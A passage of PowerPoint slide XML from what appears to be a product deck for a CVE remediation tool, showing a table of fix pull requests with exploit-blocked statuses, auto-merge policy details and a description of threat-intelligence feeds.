              <a:t>NO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="TextBox 75"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10030968" y="4800600"/>
            <a:ext cx="2194560" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Jan 14 10:00 UTC</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77" name="Rectangle 76"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5038344"/>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92608" y="5074920"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2022-0778</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="TextBox 78"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="5074920"/>
            <a:ext cx="3977640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sentinel/fix/CVE-2022-0778/prometheus/20240113</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80" name="TextBox 79"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733288" y="5074920"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PASSED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="81" name="TextBox 80"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6601968" y="5074920"/>
            <a:ext cx="1417320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXPLOIT BLOCKED ✓ (conf 8%)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="TextBox 81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8110728" y="5074920"/>
            <a:ext cx="960120" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>APPROVED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="TextBox 82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9162288" y="5074920"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NO</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84" name="TextBox 83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10030968" y="5074920"/>
            <a:ext cx="2194560" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Jan 13 12:00 UTC</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85" name="Rectangle 84"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5312664"/>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92608" y="5349240"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2022-32149</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="TextBox 86"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="5349240"/>
            <a:ext cx="3977640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sentinel/fix/CVE-2022-32149/grafana-monitoring</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88" name="TextBox 87"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733288" y="5349240"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PASSED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="TextBox 88"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6601968" y="5349240"/>
            <a:ext cx="1417320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXPLOIT BLOCKED ✓ (conf 12%)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90" name="TextBox 89"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8110728" y="5349240"/>
            <a:ext cx="960120" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MERGED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="91" name="TextBox 90"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9162288" y="5349240"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>YES</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="TextBox 91"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10030968" y="5349240"/>
            <a:ext cx="2194560" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Jan 12 15:00 UTC</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="Rectangle 92"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="5586984"/>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92608" y="5623560"/>
            <a:ext cx="1280160" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVE-2023-28154</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="95" name="TextBox 94"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1664208" y="5623560"/>
            <a:ext cx="3977640" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sentinel/fix/CVE-2023-28154/gitlab-ce/20240112</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="TextBox 95"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5733288" y="5623560"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PASSED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="TextBox 96"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6601968" y="5623560"/>
            <a:ext cx="1417320" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>EXPLOIT BLOCKED ✓ (conf 9%)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="98" name="TextBox 97"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8110728" y="5623560"/>
            <a:ext cx="960120" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MERGED</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="99" name="TextBox 98"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9162288" y="5623560"/>
            <a:ext cx="777240" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="34D399"/>
                </a:solidFill>
              </a:rPr>
              <a:t>YES</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="TextBox 99"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10030968" y="5623560"/>
            <a:ext cx="2194560" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Jan 12 14:00 UTC</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="Rectangle 100"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="591616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952744"/>
            <a:ext cx="11731752" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Key Policy Details</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="TextBox 102"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6144768"/>
            <a:ext cx="1645920" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Branch naming:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="104" name="TextBox 103"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1920240" y="6144768"/>
            <a:ext cx="10012680" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>sentinel/fix/&lt;CVE&gt;/&lt;service-name&gt;/&lt;date&gt; — every PR is fully traceable to a specific CVE and affected service.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="105" name="TextBox 104"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6382512"/>
            <a:ext cx="1645920" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Re-sim gate:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="106" name="TextBox 105"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1920240" y="6382512"/>
            <a:ext cx="10012680" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The exploit module must return BLOCKED with confidence &lt;30% before auto-merge is allowed. Higher confidence = manual review required.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="107" name="TextBox 106"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="6620256"/>
            <a:ext cx="1645920" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  Platforms:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="108" name="TextBox 107"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1920240" y="6620256"/>
            <a:ext cx="10012680" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="850" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="E2E8F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GitHub, GitLab, Bitbucket supported. CI via GitHub Actions, GitLab CI, or Jenkins. Jira ticket auto-created on PR open.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Threat Intelligence</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NVD · CISA KEV · EPSS feeds — exploit probability ranking · MITRE mapping · emerging CVE watch</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Threat Intelligence page aggregates data from three external feeds: the National Vulnerability Database (NVD) for CVSS scores and CWE classifications, CISA's Known Exploited Vulnerabilities catalogue for confirmed real-world exploitation, and FIRST.org's EPSS model for exploit probability (the statistical likelihood a CVE will be exploited in the next 30 days). Together these three signals create a priority ranking that is far more actionable than CVSS alone: a CVE with CVSS 7.5 but EPSS 63% and CISA KEV status is more urgent than a CVSS 10.0 vulnerability with EPSS 2% and no known exploit. Every CVE is also mapped to MITRE ATT&amp;CK techniques so the team understands not just what is vulnerable, but how an attacker would weaponise it.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="2148840"/>
            <a:ext cx="2286000" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="111722"/>
          </a:solidFill>
          <a:ln w="762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28600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40280"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVEs Tracked</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2423160"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="2200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
              </a:rPr>
              <a:t>12</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="TextBox 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="338328" y="2679192"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="700" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Logistics stack scope</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2606040" y="2148840"/>
            <a:ext cx="228600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604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240280"/>
            <a:ext cx="2066544" cy="182880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr sz="750" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="64748B"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CISA KEV</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="TextBox 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2715768" y="2423160"/>
            <a:ext cx="2066544" cy="438912"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
